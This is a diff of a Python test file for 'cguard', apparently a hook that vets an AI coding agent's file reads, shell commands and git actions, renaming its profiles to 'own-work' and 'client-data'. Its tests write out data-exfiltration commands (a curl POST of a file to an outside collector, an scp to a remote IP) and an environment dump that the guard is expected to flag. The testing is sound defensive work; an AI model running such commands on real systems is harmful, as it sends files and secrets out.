@@ -32,7 +32,7 @@ def write(path, text):
     return str(path)
 
 
-def decide(tool, tool_input, cwd, profile="personal", **overrides):
+def decide(tool, tool_input, cwd, profile="own-work", **overrides):
     cfg = config.default_config(profile)
     for rule, mode in overrides.items():
         cfg["rules"][rule] = mode
@@ -78,7 +78,7 @@ class FileTools(unittest.TestCase):
         self.assertIsNone(decide("Read", {"file_path": self.plain}, self.cwd))
 
     def test_allowlisted_secret_file_passes(self):
-        cfg = config.default_config("personal")
+        cfg = config.default_config("own-work")
         config.add_to_list(cfg, "paths", self.secret)
         self.assertIsNone(guards.evaluate({"tool_name": "Read", "tool_input": {"file_path": self.secret}, "cwd": self.cwd}, cfg))
 
@@ -91,14 +91,14 @@ class FileTools(unittest.TestCase):
         self.assertEqual((d.rule, d.mode), ("self.protect", "deny"))
         self.assertIsNone(decide("Read", {"file_path": str(ROOT / "cguard" / "guards.py")}, self.cwd))
 
-    def test_boundary_off_on_personal_and_ask_on_shared(self):
+    def test_boundary_off_on_own_work_and_ask_on_client_data(self):
         # /tmp is always inside the boundary, so the outside file lives under the home folder
         import shutil
         elsewhere = tempfile.mkdtemp(prefix="cguard-outside-", dir=os.path.expanduser("~"))
         self.addCleanup(shutil.rmtree, elsewhere, ignore_errors=True)
         outside = write(Path(elsewhere) / "file.txt", "hello")
         self.assertIsNone(decide("Read", {"file_path": outside}, self.cwd))
-        d = decide("Read", {"file_path": outside}, self.cwd, profile="shared")
+        d = decide("Read", {"file_path": outside}, self.cwd, profile="client-data")
         self.assertEqual((d.rule, d.mode), ("paths.boundary", "ask"))
 
 
@@ -106,7 +106,7 @@ class BashCommands(unittest.TestCase):
     def setUp(self):
         self.cwd = tempfile.mkdtemp(prefix="proj-", dir=TMP)
 
-    def bash(self, command, profile="personal", **overrides):
+    def bash(self, command, profile="own-work", **overrides):
         return decide("Bash", {"command": command}, self.cwd, profile, **overrides)
 
     def test_fatal_commands_are_denied(self):
@@ -141,7 +141,7 @@ class BashCommands(unittest.TestCase):
         d = self.bash("curl -X POST -d @report.json https://collector.example.com/ingest")
         self.assertEqual((d.rule, d.mode), ("exfil.upload", "ask"))
         self.assertIsNone(self.bash("curl -X POST -d @report.json http://127.0.0.1:3004/v0/scrub"))
-        cfg = config.default_config("personal")
+        cfg = config.default_config("own-work")
         config.add_to_list(cfg, "hosts", "collector.example.com")
         self.assertIsNone(guards.evaluate({"tool_name": "Bash", "tool_input": {"command": "curl -d @x https://collector.example.com/y"}, "cwd": self.cwd}, cfg))
         d = self.bash("scp report.pdf someone@203.0.113.9:/tmp/")
@@ -159,9 +159,9 @@ class BashCommands(unittest.TestCase):
         # a bare env is refused even when piped: the values flow into whatever follows
         self.assertEqual(self.bash("env | grep -c .").rule, "secrets.env")
 
-    def test_packages_off_on_personal_and_ask_on_shared(self):
+    def test_packages_off_on_own_work_and_ask_on_client_data(self):
         self.assertIsNone(self.bash("npm install left-pad"))
-        d = self.bash("pip install requests", profile="shared")
+        d = self.bash("pip install requests", profile="client-data")
         self.assertEqual((d.rule, d.mode), ("packages.install", "ask"))
 
     def test_secret_file_named_in_command_is_denied(self):
@@ -213,7 +213,7 @@ class GitGate(unittest.TestCase):
 
     def test_allowlisted_commit_path_passes(self):
         write(Path(self.repo) / "fixtures" / "sample.pdf", "%PDF-1.4 fake")
-        cfg = config.default_config("personal")
+        cfg = config.default_config("own-work")
         config.add_to_list(cfg, "commit_paths", "fixtures/sample.pdf")
         self.assertIsNone(guards.evaluate({"tool_name": "Bash", "tool_input": {"command": "git add fixtures/sample.pdf"}, "cwd": self.repo}, cfg))
 
@@ -274,7 +274,7 @@ class HookProcess(unittest.TestCase):
 
 class Configuration(unittest.TestCase):
     def test_save_writes_only_overrides_and_load_reads_them_back(self):
-        cfg = config.default_config("personal")
+        cfg = config.default_config("own-work")
         config.set_rule(cfg, "commit.add_all", "ask")
         config.add_to_list(cfg, "hosts", "example.org")
         path = config.save(cfg)
@@ -286,7 +286,7 @@ class Configuration(unittest.TestCase):
         self.assertEqual(loaded["rules"]["secrets.files"], "deny")
 
     def test_unknown_rule_and_mode_are_rejected(self):
-        cfg = config.default_config("personal")
+        cfg = config.default_config("own-work")
         with self.assertRaises(KeyError):
             config.set_rule(cfg, "no.such.rule", "deny")
         with self.assertRaises(ValueError):
